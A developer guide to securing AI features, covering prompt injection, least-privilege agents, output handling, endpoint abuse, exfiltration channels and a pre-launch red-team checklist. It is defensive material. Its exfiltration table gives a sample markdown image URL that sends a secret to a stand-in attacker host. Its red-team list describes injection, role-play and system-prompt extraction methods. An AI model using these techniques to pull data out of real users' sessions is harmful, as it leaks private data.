# Guardrails and AI security

Read this when: an AI feature reads content the developer did not write (user messages, uploaded
files, emails, web pages, tool results), calls tools, renders model output in a browser, or is
open to users who may abuse it or farm it for free model access.

## The threat model in one table

The model follows instructions wherever they appear in its context and cannot reliably tell the
developer's text from an attacker's. Security therefore comes from what the surrounding code
allows, not from the prompt.

| Asset | Attack | Control that actually holds |
|---|---|---|
| Other users' or tenants' data | Injection makes the model fetch or reveal it | Authorization in tools and retrieval, enforced server-side per user |
| Actions (send, delete, pay) | Injection or confusion triggers them | Least-privilege tools; approval bound to exact arguments |
| Data in the conversation | Exfiltration through links, images, tool calls | Egress controls: URL allowlists, no auto-fetched model-written URLs |
| The browser session | Model output rendered as HTML or script | Output encoding, sanitized markdown, CSP |
| The model bill | Scraping, free-tier farming, prompt stuffing | Auth, quotas, input caps, spend alerts |
| The brand | Offensive or off-topic output, jailbreak screenshots | Scope instructions, output screening, a narrow feature |
| The system prompt | Extraction | Assume it is public; put no secrets in it |

## Model output is untrusted input

Treat every model response like a form field submitted by an anonymous user, because through
injection it can be exactly that.

| Sink | Risk | Rule |
|---|---|---|
| HTML page | XSS | Render as text or through a markdown renderer with raw HTML disabled and sanitization on; never `dangerouslySetInnerHTML` or `innerHTML` with model output |
| Links and images | Exfiltration, phishing | Allow only `http(s)` (and `mailto` if needed); block `javascript:` and `data:`; allowlist image hosts or proxy them (see exfiltration) |
| SQL | Injection, data loss | Never execute model-written SQL with application credentials. If text-to-SQL is the feature: read-only role, restricted views that already apply tenant filters, statement timeout, row limit |
| Shell, `eval`, code | Remote code execution | Sandbox only (`agents-tools.md`) |
| File paths, URLs fetched server-side | Path traversal, SSRF | Validate against an allowlist; resolve and check before use (`0x:web-security`) |
| Tool arguments | Unauthorized actions | Schema validation plus authorization on the server for every call |
| Database storage, later re-rendered or re-prompted | Stored XSS, stored injection | Store as untrusted; encode at output; wrap as data when fed back to a model |
| Email, SMS, notifications sent to others | Phishing with the product's reputation | Human approval or strict templates |
| JSON consumed by code | Logic errors | Validate against the schema; check referenced IDs exist and belong to the user |

Structured output narrows the shape, not the content: a schema-valid string field can still hold
a script tag or an attacker's URL.

## Prompt injection

Direct injection is the user attacking their own session (jailbreaks): mostly a brand and abuse
problem, since the user can reach only what they could reach anyway, provided tools enforce
authorization. Indirect injection is the serious one: instructions hidden in a document, email,
web page, ticket, product review, calendar invite or tool result, acting with the victim's
privileges.

No prompt wording, delimiter or detection model blocks injection reliably. Design so that a
successful injection cannot do harm:

1. **Break the dangerous combination.** An agent is exploitable when one context has all three
   of: access to private data, exposure to untrusted content, and a way to send data out or
   take consequential action. Remove one leg per run: a run that reads the open web gets no
   private data and no write tools; a run with private data and send tools reads no untrusted
   content, or every send needs approval.
2. **Keep the control flow in code.** Decide the plan (which tools, in what order) before
   untrusted content is read, or from trusted input only. Let untrusted content influence data
   values, not which tools run.
3. **Quarantine reading.** Process untrusted content in a separate model call that has no tools
   and returns a constrained structure (enum fields, bounded strings). The privileged agent
   receives only that structure. A summary in free text can still carry the injection onward.
4. **Mark provenance.** Wrap untrusted content in clearly named tags, tell the model it is data
   that may contain instructions to be ignored, and place it in the user turn or tool results,
   never in the system prompt. This lowers the success rate; it is not a boundary.
5. **Gate consequences.** Approval for external or irreversible actions, shown with the real
   arguments (`agents-tools.md`).
6. **Detect as a tripwire.** An injection classifier on inbound content and anomaly checks on
   tool-call patterns catch the lazy attacks and produce alerts. Count them as monitoring, not
   as the defense.

Content channels people forget: file names and metadata, image text and alt text, HTML comments
and hidden text, PDF layers, tool descriptions from third-party MCP servers, the agent's own
persistent memory, and data written by other users of the same tenant.

## Least privilege for agents

Excessive agency is the gap between what the feature needs and what the agent can do.

- Give each agent only the tools its task needs; build separate agents or modes for separate
  tasks instead of one agent with every tool.
- Prefer read-only tools; make write tools specific (`add_note`, not `update_record`).
- Run every tool under the invoking user's authorization, with tenant and user taken from the
  session. The agent must never hold more rights than the user in front of it.
- Scope data: tools return the fields needed, not whole records; secrets, password hashes,
  payment details and other users' personal data never enter a tool result.
- Scope credentials: short-lived, per user, per integration; no shared admin keys.
- Limit autonomy: step, spend and rate limits per run and per user; a kill switch (a flag that
  disables a tool or the whole feature without a deploy).
- Log every tool call with user, arguments, result status and the run ID, in an audit trail
  the model cannot write to.

## Input and output filtering

| Layer | What | How | Stage |
|---|---|---|---|
| Input limits | Length, file size and type, rate | Code, before any model call | Prototype |
| Scope | Off-topic and abusive use | System prompt states the scope and what to do outside it; a small-model classifier in front for public features | Launch |
| Abuse and unsafe content in | Harassment, self-harm, illegal requests, per domain | A moderation classifier or small model with the product's own policy; decide block, soften or route to a human | Launch for public or consumer features |
| Personal data in | Users pasting identifiers, health or card data | Detect and redact before logging and, where the feature allows, before the model (`ai-data-privacy.md`) | Launch |
| Output screening | Policy violations, competitor or legal claims, leaked secrets or other tenants' identifiers | Pattern checks plus a small-model check on risky features | Launch |
| Domain rules | Medical, legal, financial advice | Constrain the feature, add required disclaimers in the UI (not left to the model), route edge cases to people | Before Launch in those domains |

Operating rules: run input checks in parallel with the main call when latency matters and
discard the answer if the check fails; with streaming, either screen before display (adds
delay) or screen sentence by sentence and be able to retract (`ai-ux.md`). Measure every filter's
false positives on real traffic: a filter that blocks legitimate users is a product bug. Handle
the provider's own refusals and safety stops as a designed state. For self-harm and similar
signals in consumer products, show vetted help resources from code, not model-written advice.

## Protecting the endpoint

An unauthenticated or generous AI endpoint is a free model API for someone else's product.

- Call the model only from the server. A provider key shipped in client code is public: anyone
  can read it from the bundle or the network tab and spend on the account. If one has shipped,
  revoke it; removing it from the code is not enough.
- Require an authenticated account for anything costly. For anonymous demos: a tiny fixed
  budget per visitor, a bot challenge, the cheapest model, low output caps, and a global daily
  spend cap that turns the demo off.
- Enforce quotas per user and per tenant in tokens or cost, not request count (one request can
  carry a full context window), plus concurrency limits. Check before the call
  (`cost-latency.md`).
- Cap input size, output tokens, conversation length and attachments at the server.
- Keep the feature narrow: a system prompt and, for public features, a scope classifier so the
  endpoint is poor value as a general-purpose chatbot.
- Free tiers: verified email at minimum; watch for signup bursts from disposable domains and
  shared devices or payment fingerprints (`0x:auth-identity`, `abuse-defense.md`).
- Alert on spend anomalies per user and in total, and set a hard limit in the provider account.
  The first notice of abuse should not be the invoice.
- Assume the system prompt will be extracted. It may hold instructions, never secrets, keys,
  internal URLs or other customers' information.

## Exfiltration channels

After an injection, the attacker needs a way out. Close each one.

| Channel | How it leaks | Fix |
|---|---|---|
| Markdown image | `![x](https://evil.example/?d=SECRET)` is fetched by the browser on render, with no click | Do not render images from model output, or allow only an image-host allowlist, or rewrite through a proxy that fetches only allowlisted hosts. Back it with a CSP `img-src` limited to known hosts |
| Links | User clicks a link with data in the query string | Show the destination; allowlist domains for auto-linked URLs; interstitial for unknown external hosts; never auto-open |
| Link previews (unfurling) | A chat or email client fetches the URL automatically, with no click | Disable unfurling for model-generated content sent to chat tools (in Slack, `unfurl_links: false` and `unfurl_media: false` on the message), or strip URLs whose host is not allowlisted before sending |
| Fetch or browse tools | Agent requests an attacker URL with data embedded | Allow fetching only URLs that came from the user or from a trusted search step, or a domain allowlist; never URLs composed by the model after reading untrusted content |
| Outbound action tools (email, webhook, comment, issue) | Data sent to a third party | Approval showing recipient and body; recipient allowlist (own organization) |
| Writes to shared places | Secret written where the attacker can read it later (public page, shared doc) | Treat writes to wider-visibility locations as external sends |
| Code sandbox | Network calls from executed code | Default-deny egress |
| Persistent memory | Poisoned note re-fires later | Confirmation before memory writes from untrusted runs |

Test: place a canary string in private context, plant an injection in a document asking for it
to be put in an image URL and in a tool call, and assert that no outbound request or rendered
element contains the canary.

## Labeling, reporting and correction

- Mark AI-generated content where it appears, and keep the mark when the content is stored,
  shared or exported, so later readers know its origin. Tell users in a conversational feature
  that they are talking to an AI. Whether disclosure is legally required depends on the
  jurisdiction and the use (the EU AI Act and several US state laws have transparency rules
  with different scopes and dates): `0x:privacy-compliance` owns that question. Labeling is the
  right product default regardless.
- State the limits once, near the output, in plain words ("AI-generated; check important
  details"). Per-message boilerplate gets ignored.
- Give every AI output a report control (thumbs down plus an optional reason, or "report a
  problem") that captures the trace ID. Route reports to a queue someone reads; harmful-content
  reports need a faster path than quality feedback.
- Let users correct: edit the output, fix a wrong remembered fact, undo an agent action. Where
  AI output is stored as a record (a summary on a ticket), keep it editable and record that a
  human changed it.
- For consequential outputs, provide a path to a human.

## Red-teaming before launch

Budget half a day before a public launch, and again after any change to tools, retrieval sources
or model. Work through this list against a staging environment with realistic data, and turn
every success into an eval case (`evals.md`).

1. **Cross-user data**: as user A, ask for user B's and tenant B's data directly, by ID, by
   guessing, and through each tool.
2. **Indirect injection**: plant instructions in every content channel the feature reads
   (document, email, web page, file name, record field written by another user). Try to make the
   agent call a write tool, reveal context, and emit a canary through each exfiltration channel.
3. **Tool abuse**: get tools called with out-of-range, foreign or malformed arguments; skip or
   spoof the approval step; repeat a write.
4. **Rendering**: make the model output script tags, event-handler attributes, `javascript:`
   links, external images, giant or deeply nested markdown.
5. **Scope and brand**: role-play, hypothetical framing, other languages, encodings, many-turn
   pressure; requests for offensive content, statements about competitors, commitments on price
   or refunds, professional advice the product must not give.
6. **System prompt extraction**: confirm nothing harmful is in it.
7. **Cost**: maximum-size inputs, long loops, parallel sessions, anonymous access; confirm
   quotas and caps hold.
8. **Failure handling**: what the user sees on refusal, timeout and filter block.

Use a model to generate attack variants at volume, and open-source scanners (garak, promptfoo's
red-team mode and similar) for breadth; hand-written attacks by someone who knows the tools
find the product-specific holes. Record results; a customer security review will ask.

## Ask the user

- **What is the worst thing this feature could do or say, and who would be affected?** Sets how
  much of this file applies. Default: assume cross-tenant leakage and unwanted outbound messages
  are unacceptable, and design those out structurally.
- **Is the feature public, free-tier or paid-only?** Decides abuse controls. Default: signed-in
  users only, with per-user quotas.
- **Which topics must the feature refuse or hand to a human?** A business and legal choice.
  Default: stay within the product's domain; no medical, legal or financial advice; hand off on
  account and billing disputes.
- **Does the agent need to read content from outside the organization (inbound email, web)?**
  Default: not in the same run as private data plus send-capable tools.
- **Who reviews reports of bad AI output, and how fast?** Default: the founder, within one
  business day, with harmful-content reports alerting immediately.
